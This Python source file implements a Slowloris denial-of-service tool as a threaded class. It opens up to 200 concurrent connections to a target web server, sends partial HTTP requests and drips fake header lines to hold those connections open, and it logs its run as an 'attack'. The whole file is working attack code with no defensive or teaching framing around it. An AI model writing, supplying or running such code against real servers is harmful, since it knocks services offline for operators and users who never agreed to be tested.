import socket
import time
import threading
import random

class Slowloris:
    """
    Slowloris attack - opens many connections and keeps them alive
    by sending partial HTTP requests slowly
    """
    def __init__(self, target, duration=30, threads=200, port=80, callback=None):
        self.target = target
        self.duration = duration
        self.threads = threads
        self.port = port
        self.callback = callback
        self.stop_event = threading.Event()
        self.stats = {
            "connections_opened": 0,
            "connections_active": 0,
            "start_time": None,
            "end_time": None
        }
        self.active_sockets = []
        self.lock = threading.Lock()
        
        # Remove protocol if present
        self.target = target.replace("http://", "").replace("https://", "").split("/")[0]
    
    def log(self, message):
        if self.callback:
            self.callback(message)
        else:
            print(f"[Slowloris] {message}")
    
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target, self.port))
            
            # Send partial HTTP request
            http_request = f"GET /{random.randint(1000, 999999)} HTTP/1.1\r\n"
            http_request += f"Host: {self.target}\r\n"
            http_request += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
            http_request += "Accept: text/html,application/xhtml+xml\r\n"
            
            sock.send(http_request.encode())
            
            with self.lock:
                self.stats["connections_opened"] += 1
                self.stats["connections_active"] += 1
                self.active_sockets.append(sock)
            
            return sock
        except Exception as e:
            return None
    
    def keep_alive(self, sock):
        try:
            while not self.stop_event.is_set():
                try:
                    # Send header line to keep connection alive
                    header = f"X-a: {random.randint(1, 5000)}\r\n"
                    sock.send(header.encode())
                    time.sleep(10)  # Wait between keep-alive headers
                except:
                    break
        except:
            pass
        finally:
            with self.lock:
                self.stats["connections_active"] -= 1
            try:
                sock.close()
            except:
                pass
    
    def worker(self):
        while not self.stop_event.is_set():
            sock = self.create_connection()
            if sock:
                self.keep_alive(sock)
            time.sleep(0.1)
    
    def run(self):
        self.stats["start_time"] = time.time()
        self.log(f"Starting Slowloris attack on {self.target}:{self.port}")
        self.log(f"Duration: {self.duration}s | Threads: {self.threads}")
        
        thread_list = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        # Clean up remaining sockets
        for sock in self.active_sockets:
            try:
                sock.close()
            except:
                pass
        
        self.stats["end_time"] = time.time()
        self.log(f"Attack completed. Connections opened: {self.stats['connections_opened']}")
        return self.stats
    
    def stop(self):
        self.stop_event.set()
        self.log("Stop signal received")